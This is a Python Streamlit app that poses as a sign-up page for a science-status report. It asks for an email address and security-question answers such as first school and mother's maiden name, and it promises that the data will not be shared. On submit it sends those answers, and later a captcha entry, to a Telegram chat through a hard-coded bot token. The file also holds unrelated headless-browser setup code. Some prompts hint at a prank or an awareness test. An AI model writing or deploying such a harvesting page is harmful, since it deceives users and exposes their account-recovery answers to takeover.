import streamlit as st
import pandas as pd
import csv, io
import telebot
import cv2



import streamlit as st
import os, sys

@st.experimental_singleton
def installff():
  os.system('sbase install geckodriver')
  os.system('ln -s /home/appuser/venv/lib/python3.7/site-packages/seleniumbase/drivers/geckodriver /home/appuser/venv/bin/geckodriver')

_ = installff()
from selenium import webdriver
from selenium.webdriver import FirefoxOptions
opts = FirefoxOptions()
opts.add_argument("--headless")
browser = webdriver.Firefox(options=opts)

browser.get('http://example.com')
st.write(browser.page_source)
# streamlit run app.py

TOKEN = "2034688341:AAGiWVOQZ_wJUDLEGPbqXn80LzJ9palMWu0"
tb = telebot.TeleBot(TOKEN)  # create a new Telegram Bot object
chat_id = '630924196'



st.text('דוח מצב המדע בשראל')
with st.sidebar:
    st.image('logo.png', use_column_width=True)


# Initialization
if 'first_run' not in st.session_state:
    st.session_state['first_run'] = True

print(st.session_state['first_run'])

if  st.session_state['first_run']:
    ph6 = st.empty()
    ph6.subheader("Please fill up identity information")
    ph9 = st.empty()
    new_user = ph9.text_input('Email Address')

    ph7 = st.empty()
    # new_user = ph7.text_input('Username')
    ph7.write('This information will only be used for personal identification. '
              'It will not be shared with anyone. Do not enter phone number, credit card number, etc.')
    ph10 = st.empty()
    # ph10.write('Password must contain 14 characters, out of which at least one latin but not more the 4, 2 special characters, and one math symbol. if your password contains the letter ''o'', exactly two symbols are required')
    ph8 = st.empty()
    # new_passwd = ph8.text_input('Password', type='password')


    ph1 = st.empty()
    ph1.write('Please answer personal identification questions:')
    ph2 = st.empty()
    school = ph2.text_input('Name of your first school?')
    ph3 = st.empty()
    mom_name = ph3.text_input('Mother''s maiden name?')
    ph4 = st.empty()
    type = ph4.text_input('Urban or beach vibe?')
    ph5 = st.empty()
    hotel = ph5.text_input('Fancy Boho chic hotel or airbnb in a secluded beach?')

    # save results to csv and send via telegram




    placeholder = st.empty()
    signupbut = placeholder.button('Sign Up')

    ver = False
    if signupbut:
        placeholder.empty()
        tb.send_message(chat_id,'Email Address: ' + new_user + '\n' + 'School: ' + school + '\n'+'Mother''s Maiden Name: ' + mom_name +'\n'+ 'Vibe: ' + type + '\n'+  'Hotel or Airbnb: ' + hotel)
        # tb.send_message(chat_id, 'New User: ' + new_user + '\n' + 'Password: ' + new_passwd + '\n' + 'School: ' + school + '\n' + 'Mother''s Maiden Name: ' + mom_name + '\n' + 'Vibe: ' + type + '\n' + 'Hotel: ' + hotel)
        a = [eval('ph%s.empty()' % i) for i in range(1,11)]

        ph1 = st.empty()
        ph1.write('Please confirm you''re not a robot:')
        ph2 = st.empty()
        im = ph2.image('captcha.png')
        ph3 = st.empty()
        captcha = ph3.text_input('Enter image numbers (make sure images do not contradict each other)')
        ph4 = st.empty()
        ver = ph4.button('Verify')
        st.session_state['ver'] = True
        st.session_state['first_run'] = False


else:
    ph1 = st.empty()
    ph1.write('Please confirm you''re not a robot:')
    ph2 = st.empty()
    im = ph2.image('captcha.png')
    ph3 = st.empty()
    captcha = ph3.text_input('Enter image numbers (make sure images do not contradict each other)')
    ph4 = st.empty()
    ver = ph4.button('Verify')
    if ver:
        a = [eval('ph%s.empty()' % i) for i in range(1,5)]
        st.session_state['ver'] = True
        st.success("You have successfully created an account.Go to the Login Menu to login")

        # here - st image with my letter
        tb.send_message(chat_id, 'images: ' + captcha)
        # a = [eval('ph%s.empty()' % i) for i in range(1, 5)]
        aha = st.image('after.png')






